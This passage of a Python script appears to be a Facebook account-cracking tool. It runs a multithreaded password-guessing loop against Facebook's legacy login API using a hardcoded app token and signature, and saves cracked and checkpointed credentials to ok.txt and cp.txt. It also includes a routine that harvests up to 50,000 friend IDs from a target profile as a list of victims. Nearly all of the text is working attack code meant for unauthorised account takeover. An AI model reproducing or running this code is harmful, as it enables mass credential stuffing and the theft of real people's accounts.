		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print("\x1b[1;97m[\x1b[1;91mFK-CP\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass6+"\x1b[1;91m | \x1b[1;97m"+name)
		                                                cp=open("cp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print("\x1b[1;92m[Successfull] "+uid+" | "+pass6+" | "+name)
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                else:
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\x1b[1;97m[\x1b[1;91mFK-CP\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass7+"\x1b[1;91m | \x1b[1;97m"+name)
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                    else:
		                                                        if 'access_token' in d:
		                                                            print("\x1b[1;92m[Successfull] "+uid+" | "+pass7+" | "+name)
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
		                                        
									
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print ('\033[1;97m[+]\033[1;97m Process Has Been Completed')
	print('\033[1;97m[+]\033[1;97m Total CP/OK:\033[0;97m  '+str(len(cps))+'/\033[1;92m '+str(len(oks)))
	print("\033[1;97m--------------------------------------------------")
	raw_input("\033[0;97mPress Enter To Main Menu Back")
	menu()
	
###EXTRACTING###
def extracting():
    os.system('clear')
    try:
        token = open(".login.txt","r").read()
    except IOError:
        print ' Token Invalid'
        os.system("rm -rf .login.txt")
        time.sleep(0.01)
        loginvia()

    try:
        os.mkdir('/sdcard/dump')
    except OSError:
        pass

    try:
        os.system('clear')
        logo()
        print 50 * '\x1b[1;91m\xe2\x94\x80'
        idt = raw_input(' Put Dump ID : ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            op = json.loads(jok.text)
            print ' Extracted ID      : ' + op['name']
        except KeyError:
            print ' \x1b[1;91mPublic ID Missing !'
            raw_input('\n\x1b[1;93m[\x1b[1;91mBack\x1b[1;93m]')
            menu()

        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(50000)&access_token=' + token, headers=header)
        z = json.loads(r.text)
        jalan('\x1b[1;95m • \x1b[1;91mRetrieve all Friend IDs \x1b[1;97m...')
        print 50 * '\x1b[1;91m\xe2\x94\x80'
        bz = open('/sdcrad/dump/fari.txt', 'w')
        for a in z['friends']['data']:
            idfromteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[1;95m • \x1b[1;93m' + str(len(idfromteman)) + '\x1b[1;93m -> ',
            sys.stdout.flush()
            time.sleep(0.005)
            print '\x1b[1;92m' + a['id']

        bz.close()
        print '\n\x1b[1;93m [\x1b[1;92m\xe2\x9c\x93\x1b[1;93m] \x1b[1;92mSukses Mengambil ID '
        print '\r\x1b[1;93m [\x1b[1;92m\xe2\x80\xa2\x1b[1;93m] \x1b[1;92mTotal ID\x1b[1;91m :\x1b[1;92m %s' % len(idfromteman)
        done = raw_input('\r\x1b[1;93m [\x1b[1;92m\xe2\x80\xa2\x1b[1;93m] \x1b[1;92mSave File Name\x1b[1;91m : \x1b[1;92m')
        os.rename('/sdcard/grab/fari.txt', '/sdcard/dump/' + done)
        print '\r\x1b[1;93m [\x1b[1;92m\xe2\x80\xa2\x1b[1;93m] \x1b[1;92mSaved Files \x1b[1;91m: \x1b[1;92mdump/' + done
        raw_input('\n\x1b[1;93m [\x1b[1;91mBack\x1b[1;93m]')
        menu()
    except OSError:
        print '\x1b[1;91m File Not Saved '
        raw_input('\n\x1b[1;93m [\x1b[1;91mBack\x1b[1;93m]')
        menu()
    except IOError:
        print '\x1b[1;91m Failed To Create File'
        raw_input('\n\x1b[1;93m [\x1b[1;91mBack\x1b[1;93m]')
        menu()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m Stop '
        raw_input('\n\x1b[1;93m [\x1b[1;91mBack\x1b[1;93m]')
        menu()
    except KeyError:
        print '\x1b[1;91m Fail '
        raw_input('\n\x1b[1;93m [\x1b[1;91mBack\x1b[1;93m]')
        menu()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m No Connection !'
        keluar()
	
if __name__ == '__main__':
    reg()
